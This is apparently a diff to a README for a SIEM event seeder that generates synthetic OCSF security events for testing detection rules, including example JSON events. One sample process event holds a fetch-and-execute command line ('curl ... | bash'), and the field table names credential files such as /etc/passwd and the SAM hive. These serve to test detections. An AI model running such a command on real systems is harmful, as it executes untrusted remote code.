@@ -155,6 +155,200 @@ EOF
   - Automatically stays in sync with rule changes
   - Includes MITRE ATT&CK mapping from rules
   - No manual coding of attack patterns needed
+
+**Supported OCSF Fields (17 Core Fields):**
+
+The seeder intelligently generates realistic values for these critical SIEM detection fields:
+
+| Tier | Field | Usage | Generated Value Example |
+|------|-------|-------|------------------------|
+| **Universal** | `.class_uid` | Event type classification | 3002 (Authentication), 4001 (Network), 1007 (Process) |
+| | `.status_id` | Success/Failure indicator | 1 (Success), 2 (Failure) |
+| | `.time` | Event timestamp | Unix timestamp with jitter |
+| | `.severity_id` | Event severity | 1-5 (Info to Critical) |
+| **Identity** | `.actor.user.name` | Who performed action | "jsmith", "admin", "dbaker" |
+| | `.actor.user.uid` | User identifier | UUID v4 |
+| | `.user.name` | Target user | "root", "administrator" |
+| **Network** | `.src_endpoint.ip` | Source IP address | "192.168.1.100" |
+| | `.dst_endpoint.ip` | Destination IP | "10.0.0.50" |
+| | `.dst_endpoint.port` | Destination port | 22, 443, 3389 (integer) |
+| | `.src_endpoint.port` | Source port | 1024-65535 (integer) |
+| **Device** | `.device.hostname` | Device name | "server-01.example.com" |
+| | `.device.ip` | Device IP | "172.16.0.10" |
+| **Process/File** | `.process.name` | Process name | "sshd", "powershell.exe", "bash" |
+| | `.process.pid` | Process ID | 1234 (integer) |
+| | `.process.cmd_line` | Command line | "/bin/bash -c 'whoami'" |
+| | `.file.path` | File path | "/etc/passwd", "C:\\Windows\\System32\\config\\SAM" |
+
+**Baseline Field Population:**
+
+To create realistic events that match production data, the seeder automatically populates these optional fields even if not required by the rule:
+
+- **Device context**: `device.hostname`, `device.ip`, `device.os.name`, `device.type`
+- **Metadata**: `metadata.product.vendor_name`, `metadata.product.name`, `metadata.version`
+- **Connection info** (network events): `connection_info.protocol_name`, `connection_info.direction`
+- **Session info** (authentication): `actor.session.uid`, `actor.session.issuer`
+- **Process context** (process events): `process.pid`, `process.cmd_line`, `process.file.path`
+
+**Example Generated Events:**
+
+<details>
+<summary>Authentication Failure (class_uid: 3002)</summary>
+
+```json
+{
+  "class_uid": 3002,
+  "category_uid": 3,
+  "category_name": "Identity & Access Management",
+  "class_name": "Authentication",
+  "activity_id": 1,
+  "activity_name": "Logon",
+  "status_id": 2,
+  "status": "Failure",
+  "severity_id": 3,
+  "time": 1732000000,
+  "actor": {
+    "user": {
+      "name": "admin",
+      "uid": "a1b2c3d4-e5f6-7890-abcd-ef1234567890"
+    },
+    "session": {
+      "uid": "sess-12345",
+      "issuer": "TelHawk Auth",
+      "created_at": 1731998000
+    }
+  },
+  "src_endpoint": {
+    "ip": "192.168.1.100",
+    "port": 45678
+  },
+  "device": {
+    "hostname": "web-server-01.corp.example.com",
+    "ip": "10.0.1.50",
+    "type": "Server",
+    "type_id": 1,
+    "os": {
+      "name": "Linux",
+      "type": "Linux",
+      "type_id": 200
+    }
+  },
+  "metadata": {
+    "product": {
+      "vendor_name": "TelHawk",
+      "name": "Event Seeder",
+      "version": "2.0.0-rule-based"
+    },
+    "version": "1.1.0"
+  }
+}
+```
+</details>
+
+<details>
+<summary>Port Scanning (class_uid: 4001)</summary>
+
+```json
+{
+  "class_uid": 4001,
+  "category_uid": 4,
+  "category_name": "Network Activity",
+  "class_name": "Network Activity",
+  "activity_id": 5,
+  "activity_name": "Traffic",
+  "severity_id": 1,
+  "time": 1732000010,
+  "src_endpoint": {
+    "ip": "192.168.1.100",
+    "port": 54321,
+    "name": "",
+    "uid": ""
+  },
+  "dst_endpoint": {
+    "ip": "10.0.0.50",
+    "port": 22,
+    "name": "",
+    "uid": ""
+  },
+  "connection_info": {
+    "protocol_name": "TCP",
+    "direction": "outbound",
+    "direction_id": 2
+  },
+  "device": {
+    "hostname": "scanner-vm.example.com",
+    "ip": "192.168.1.100",
+    "type": "Server",
+    "type_id": 1,
+    "os": {
+      "name": "Linux",
+      "type": "Linux",
+      "type_id": 200
+    }
+  },
+  "metadata": {
+    "product": {
+      "vendor_name": "TelHawk",
+      "name": "Event Seeder",
+      "version": "2.0.0-rule-based"
+    },
+    "version": "1.1.0"
+  }
+}
+```
+</details>
+
+<details>
+<summary>Process Activity (class_uid: 1007)</summary>
+
+```json
+{
+  "class_uid": 1007,
+  "category_uid": 1,
+  "category_name": "System Activity",
+  "class_name": "Process Activity",
+  "activity_id": 1,
+  "activity_name": "Launch",
+  "severity_id": 1,
+  "time": 1732000020,
+  "process": {
+    "name": "bash",
+    "pid": 12345,
+    "cmd_line": "/bin/bash -c 'curl http://example.com/script.sh | bash'",
+    "file": {
+      "path": "/bin/bash",
+      "name": "bash"
+    }
+  },
+  "actor": {
+    "user": {
+      "name": "jsmith",
+      "uid": "b2c3d4e5-f6a7-8901-bcde-f23456789012"
+    }
+  },
+  "device": {
+    "hostname": "workstation-05.corp.local",
+    "ip": "172.16.0.25",
+    "type": "Server",
+    "type_id": 1,
+    "os": {
+      "name": "Linux",
+      "type": "Linux",
+      "type_id": 200
+    }
+  },
+  "metadata": {
+    "product": {
+      "vendor_name": "TelHawk",
+      "name": "Event Seeder",
+      "version": "2.0.0-rule-based"
+    },
+    "version": "1.1.0"
+  }
+}
+```
+</details>
+
 ## Architecture
 See `docs/SERVICES.md` for service flow and summaries.
 
